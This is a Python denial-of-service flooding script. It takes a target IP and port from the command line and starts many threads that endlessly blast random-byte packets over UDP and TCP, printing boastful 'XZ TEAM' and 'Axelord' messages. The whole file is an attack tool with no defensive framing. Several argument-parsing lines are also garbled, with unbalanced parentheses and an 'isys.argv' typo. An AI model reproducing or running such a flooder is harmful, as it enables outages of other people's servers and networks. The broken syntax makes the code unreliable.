import random
import sys
import socket
import threading

ip = str(sys.argv[1]))
port = int(isys.argv[2]))
choice = str(sys.argv[3]))
times = int(sys.argv[4]))
threads = int(sys.argv[5]))

def run():
	data = random._urandom(1180)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XZ TEAM NIH BOSS!!!")
		except:
			print("[X] AMPUN BANG!!!")

def run2():
	data = random._urandom(180)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XZ TEAM NIH BOSS!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

def run3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Axelord NIH BOSS!!!")
		except:
			s.close()
			print("[X] AMPUN BANG")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
